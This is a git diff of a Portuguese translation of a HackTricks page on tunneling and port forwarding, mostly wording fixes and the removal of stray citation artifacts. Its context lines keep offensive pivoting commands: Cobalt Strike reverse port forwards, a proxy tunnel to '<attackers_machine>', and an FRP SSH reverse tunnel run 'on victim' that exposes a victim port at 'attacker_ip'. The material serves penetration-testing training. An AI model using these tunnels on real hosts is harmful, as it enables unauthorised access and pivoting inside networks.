@@ -1,4 +1,4 @@
-# Tunneling e Encaminhamento de Portas
+# Tunneling and Port Forwarding
 
 {{#include ../banners/hacktricks-training.md}}
 
@@ -89,7 +89,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **Segurança – Ataque Terrapin (CVE-2023-48795)**
-> O ataque de downgrade Terrapin de 2023 pode permitir que um homem-no-meio interfira no início do handshake SSH e injete dados em **qualquer canal encaminhado** ( `-L`, `-R`, `-D` ). Certifique-se de que tanto o cliente quanto o servidor estejam corrigidos (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ou desative explicitamente os algoritmos vulneráveis `chacha20-poly1305@openssh.com` e `*-etm@openssh.com` em `sshd_config`/`ssh_config` antes de confiar em túneis SSH. citeturn4search0
+> O ataque de downgrade Terrapin de 2023 pode permitir que um homem-no-meio interfira no início do handshake SSH e injete dados em **qualquer canal encaminhado** ( `-L`, `-R`, `-D` ). Certifique-se de que tanto o cliente quanto o servidor estejam corrigidos (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ou desative explicitamente os algoritmos vulneráveis `chacha20-poly1305@openssh.com` e `*-etm@openssh.com` em `sshd_config`/`ssh_config` antes de confiar em túneis SSH.
 
 ## SSHUTTLE
 
@@ -156,14 +156,14 @@ rportfwd stop [bind port]
 ```
 Para notar:
 
-- O **reencaminhamento de porta reversa do Beacon** é projetado para **túnel de tráfego para o Servidor da Equipe, não para relatar entre máquinas individuais**.
+- O **reverso de porta do Beacon** é projetado para **túnel de tráfego para o Servidor da Equipe, não para retransmitir entre máquinas individuais**.
 - O tráfego é **tuneado dentro do tráfego C2 do Beacon**, incluindo links P2P.
-- **Privilégios de administrador não são necessários** para criar reencaminhamentos de porta reversa em portas altas.
+- **Privilégios de administrador não são necessários** para criar reversos de porta em portas altas.
 
 ### rPort2Port local
 
 > [!WARNING]
-> Neste caso, a **porta é aberta no host do beacon**, não no Servidor da Equipe e o **tráfego é enviado para o cliente Cobalt Strike** (não para o Servidor da Equipe) e de lá para o host:porta indicado.
+> Neste caso, a **porta é aberta no host do beacon**, não no Servidor da Equipe, e o **tráfego é enviado para o cliente Cobalt Strike** (não para o Servidor da Equipe) e de lá para o host:porta indicado.
 ```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -348,7 +348,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 Você precisa ter **acesso RDP sobre o sistema**.\
 Baixe:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta ferramenta usa `Dynamic Virtual Channels` (`DVC`) do recurso de Serviço de Área de Trabalho Remota do Windows. DVC é responsável por **tunneling de pacotes sobre a conexão RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta ferramenta utiliza `Dynamic Virtual Channels` (`DVC`) do recurso de Serviço de Área de Trabalho Remota do Windows. DVC é responsável por **tunneling de pacotes sobre a conexão RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 No seu computador cliente, carregue **`SocksOverRDP-Plugin.dll`** assim:
@@ -394,7 +394,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Agora, se você configurar, por exemplo, no alvo, o serviço **SSH** para escutar na porta 443. Você pode se conectar a ele através da porta 2222 do atacante.\
+Agora, se você configurar, por exemplo, o serviço **SSH** na vítima para escutar na porta 443. Você pode se conectar a ele através da porta 2222 do atacante.\
 Você também poderia usar um **meterpreter** que se conecta a localhost:443 e o atacante está escutando na porta 2222.
 
 ## YARP
@@ -444,7 +444,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Mudar o DNS do proxychains
 
-Proxychains intercepta a chamada `gethostbyname` da libc e encaminha a solicitação de DNS tcp através do proxy socks. Por **padrão**, o servidor **DNS** que o proxychains usa é **4.2.2.2** (codificado). Para mudá-lo, edite o arquivo: _/usr/lib/proxychains3/proxyresolv_ e altere o IP. Se você estiver em um **ambiente Windows**, pode definir o IP do **controlador de domínio**.
+Proxychains intercepta a chamada `gethostbyname` da libc e encaminha a solicitação de DNS tcp através do proxy socks. Por **padrão**, o servidor **DNS** que o proxychains usa é **4.2.2.2** (hardcoded). Para mudá-lo, edite o arquivo: _/usr/lib/proxychains3/proxyresolv_ e altere o IP. Se você estiver em um **ambiente Windows**, pode definir o IP do **controlador de domínio**.
 
 ## Túneis em Go
 
@@ -513,12 +513,12 @@ _É também possível adicionar autenticação e TLS, se necessário._
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
 ```
-#### Sniffing HTTP calls
+#### Capturando chamadas HTTP
 
 _Utilizado para XSS, SSRF, SSTI ..._\
 Diretamente do stdout ou na interface HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
-#### Tunneling internal HTTP service
+#### Tunelando serviço HTTP interno
 ```bash
 ./ngrok http localhost:8080 --host-header=rewrite
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
@@ -572,11 +572,11 @@ Inicie o conector:
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Porque todo o tráfego sai do host **para fora pela porta 443**, os túneis Cloudflared são uma maneira simples de contornar ACLs de entrada ou limites de NAT. Esteja ciente de que o binário geralmente é executado com privilégios elevados – use contêineres ou a flag `--user` quando possível. citeturn1search0
+Porque todo o tráfego sai do host **saindo pela porta 443**, os túneis Cloudflared são uma maneira simples de contornar ACLs de entrada ou limites de NAT. Esteja ciente de que o binário geralmente é executado com privilégios elevados – use contêineres ou a flag `--user` quando possível.
 
 ## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp) é um proxy reverso em Go que é mantido ativamente e suporta **TCP, UDP, HTTP/S, SOCKS e P2P NAT-hole-punching**. A partir da versão **v0.53.0 (Maio de 2024)**, ele pode atuar como um **Gateway de Túnel SSH**, permitindo que um host alvo crie um túnel reverso usando apenas o cliente OpenSSH padrão – nenhum binário extra é necessário.
+[`frp`](https://github.com/fatedier/frp) é um proxy reverso em Go que é mantido ativamente e suporta **TCP, UDP, HTTP/S, SOCKS e P2P NAT-hole-punching**. A partir da **v0.53.0 (Maio de 2024)**, ele pode atuar como um **Gateway de Túnel SSH**, permitindo que um host alvo crie um túnel reverso usando apenas o cliente OpenSSH padrão – nenhum binário extra é necessário.
 
 ### Túnel TCP reverso clássico
 ```bash
@@ -606,7 +606,7 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-O comando acima publica a porta da vítima **8080** como **attacker_ip:9000** sem implantar nenhuma ferramenta adicional – ideal para pivotar vivendo da terra. citeturn2search1
+O comando acima publica a porta da vítima **8080** como **attacker_ip:9000** sem implantar nenhuma ferramenta adicional – ideal para pivotar vivendo da terra.
 
 ## Outras ferramentas para verificar
 
